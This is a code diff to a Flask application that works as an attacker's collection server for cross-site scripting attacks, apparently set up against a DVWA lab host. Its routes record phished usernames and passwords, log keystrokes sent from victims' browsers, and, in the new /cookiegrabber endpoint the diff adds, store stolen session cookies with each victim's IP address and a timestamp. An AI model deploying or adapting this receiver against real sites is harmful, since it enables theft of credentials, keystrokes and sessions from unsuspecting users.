@@ -1,5 +1,5 @@
 import os
-
+from datetime import datetime
 from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
@@ -19,7 +19,7 @@ def login():
 def capture():
     username = request.args['username']
     password = request.args['password']
-    with open('log.log', 'a+') as f:
+    with open('app_logs/log.log', 'a+') as f:
         f.write(f'Username: {username} Password: {password}\r\n')
     return redirect('http://10.0.0.136/vulnerabilities/xss_d/?default=English')
 
@@ -44,9 +44,9 @@ def phish():
 @app.route('/keylogger')
 def logKey():
     keypress = request.args['key']
-    print(f"Key pressed: {str(keypress)} and then let go")
+    ip = request.remote_addr
     shift = False
-    with open('keylog.log', 'a+') as f:
+    with open('app_logs/keylog.log', 'a+') as f:
         if str(keypress) == "Enter":
             f.write("\r\n")
         elif str(keypress) == "yes":
@@ -65,6 +65,15 @@ def logKey():
                 shift = False
             f.write(keypress)
     return "hi"
+
+
+@app.route('/cookiegrabber')
+def cookie():
+    time = datetime.now()
+    cookie = request.args['cookie']
+    with open('app_logs/cookies.log', 'a+') as f:
+        f.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]  IP: {request.remote_addr} sent cookies: {cookie}\r\n')
+    return "test"
 
 
 if __name__ == "__main__":
